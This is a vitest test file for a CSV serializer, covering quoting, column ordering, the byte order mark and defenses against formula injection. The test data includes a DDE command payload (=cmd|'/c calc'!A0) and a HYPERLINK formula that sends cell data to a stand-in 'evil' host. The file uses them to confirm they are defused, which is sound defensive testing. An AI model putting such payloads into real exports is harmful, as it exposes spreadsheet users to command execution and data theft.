import { describe, expect, it } from 'vitest';

import {
  CSV_CONTENT_TYPE,
  CSV_LINE_BREAK,
  UTF8_BOM,
  orderColumns,
  toCSVRow,
  toCSVValue,
} from './csv';

describe('toCSVValue', () => {
  describe('empty values', () => {
    it.each([
      [undefined, ''],
      [null, ''],
      ['', ''],
    ])('serializes %p as an empty field', (input, expected) => {
      expect(toCSVValue(input)).toBe(expected);
    });

    it('keeps falsy values that are not empty', () => {
      expect(toCSVValue(0)).toBe('0');
      expect(toCSVValue(false)).toBe('false');
    });
  });

  describe('RFC 4180 quoting', () => {
    it('leaves plain values unquoted', () => {
      expect(toCSVValue('plain')).toBe('plain');
    });

    it('quotes values containing the delimiter', () => {
      expect(toCSVValue('a,b')).toBe('"a,b"');
    });

    it('doubles inner quotes and wraps the field', () => {
      expect(toCSVValue('He said "hi", ok')).toBe('"He said ""hi"", ok"');
    });

    it('quotes values containing a quote even without a delimiter', () => {
      expect(toCSVValue('say "hi"')).toBe('"say ""hi"""');
    });

    it.each([
      ['line1\nline2', '"line1\nline2"'],
      ['line1\r\nline2', '"line1\r\nline2"'],
    ])('quotes %p so the row is not split', (input, expected) => {
      expect(toCSVValue(input)).toBe(expected);
    });

    it('honours a custom delimiter', () => {
      expect(toCSVValue('a;b', { delimiter: ';' })).toBe('"a;b"');
      expect(toCSVValue('a,b', { delimiter: ';' })).toBe('a,b');
    });
  });

  describe('formula injection', () => {
    it.each([
      ["=cmd|'/c calc'!A0", "'=cmd|'/c calc'!A0"],
      ['@SUM(1+9)*cmd', "'@SUM(1+9)*cmd"],
      ['-2+3', "'-2+3"],
      ['+49 151 12345', "'+49 151 12345"],
      ['\t=1+1', "'\t=1+1"],
    ])('defuses %p', (input, expected) => {
      expect(toCSVValue(input)).toBe(expected);
    });

    it('defuses and quotes an exfiltration payload', () => {
      expect(toCSVValue('=HYPERLINK("http://evil/"&A1,"click")')).toBe(
        '"\'=HYPERLINK(""http://evil/""&A1,""click"")"'
      );
    });

    it.each(['-5', '+3.2', '1e-4', '-0.5', '+1E10'])('leaves the number %p untouched', (input) => {
      expect(toCSVValue(input)).toBe(input);
    });

    it('can be opted out of', () => {
      expect(toCSVValue('=1+1', { escapeFormulas: false })).toBe('=1+1');
    });

    it('still quotes correctly when escaping is disabled', () => {
      expect(toCSVValue('=1+1,2', { escapeFormulas: false })).toBe('"=1+1,2"');
    });
  });
});

describe('toCSVRow', () => {
  it('joins serialized values with the delimiter', () => {
    expect(toCSVRow(['Title', 'a,b', 'say "hi"', '=1+1', null])).toBe(
      'Title,"a,b","say ""hi""",\'=1+1,'
    );
  });

  it('honours a custom delimiter', () => {
    expect(toCSVRow(['a', 'b;c'], { delimiter: ';' })).toBe('a;"b;c"');
  });

  it('produces a parsable document when joined with CSV_LINE_BREAK', () => {
    const rows = [
      toCSVRow(['Title', 'Body']),
      toCSVRow(['a,b', 'multi\nline']),
      toCSVRow(['=1+1', 'say "hi"']),
    ];

    expect(rows.join(CSV_LINE_BREAK) + CSV_LINE_BREAK).toBe(
      'Title,Body\r\n"a,b","multi\nline"\r\n\'=1+1,"say ""hi"""\r\n'
    );
  });
});

describe('orderColumns', () => {
  const available = ['title', 'createdAt', 'author'];

  it('keeps every column in natural order when no order is given', () => {
    expect(orderColumns(available, [])).toEqual(available);
  });

  it('applies the requested order', () => {
    expect(orderColumns(available, ['author', 'title', 'createdAt'])).toEqual([
      'author',
      'title',
      'createdAt',
    ]);
  });

  it('drops columns that are not in the order', () => {
    expect(orderColumns(available, ['title'])).toEqual(['title']);
  });

  it('ignores requested columns that do not exist', () => {
    expect(orderColumns(available, ['title', 'ghost'])).toEqual(['title']);
  });

  it('matches exactly rather than by substring', () => {
    expect(orderColumns(['title'], ['titleTag'])).toEqual([]);
    expect(orderColumns(['titleTag'], ['title'])).toEqual([]);
  });

  it('handles more columns than the qs arrayLimit', () => {
    const columns = Array.from({ length: 150 }, (_, i) => `col${i + 1}`);

    expect(orderColumns([...columns].reverse(), columns)).toEqual(columns);
  });
});

describe('UTF8_BOM', () => {
  it('is the U+FEFF byte order mark', () => {
    expect(UTF8_BOM).toBe('\uFEFF');
    expect(UTF8_BOM).toHaveLength(1);
  });

  it('encodes to the three-byte UTF-8 BOM Excel looks for', () => {
    expect([...Buffer.from(UTF8_BOM, 'utf8')]).toEqual([0xef, 0xbb, 0xbf]);
  });

  it('puts the marker before the header row', () => {
    const content = UTF8_BOM + toCSVRow(['Straße', 'Body']) + CSV_LINE_BREAK;

    expect(Buffer.from(content, 'utf8').subarray(0, 3)).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
    expect(content.slice(1)).toBe('Straße,Body\r\n');
  });
});

describe('CSV_CONTENT_TYPE', () => {
  it('declares the charset', () => {
    expect(CSV_CONTENT_TYPE).toBe('text/csv; charset=utf-8');
  });
});
